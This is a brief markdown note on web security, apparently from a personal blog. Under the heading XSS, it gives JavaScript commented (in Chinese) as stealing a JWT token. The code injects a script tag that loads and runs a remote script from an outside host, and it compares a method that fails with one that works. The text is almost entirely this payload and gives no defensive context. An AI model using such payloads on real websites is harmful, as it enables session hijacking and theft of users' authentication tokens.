# Web Security 

## XSS


https://cdn.xgqfrms.xyz/web-security/xss-jwt-token.js

```js
// XSS 窃取 JWT token

// 不好使 ❌
document.body.insertAdjacentHTML(`beforeend`, `<script src="https://cdn.xgqfrms.xyz/web-security/xss-jwt-token.js" async></script>`);

// 好使 ✅
const script = document.createElement(`script`);
script.id = `xss`;
script.src = `https://cdn.xgqfrms.xyz/web-security/xss-jwt-token.js`;
document.body.appendChild(script);


```

![](https://img2023.cnblogs.com/blog/928074/202212/928074-20221216012356130-1722550021.png)
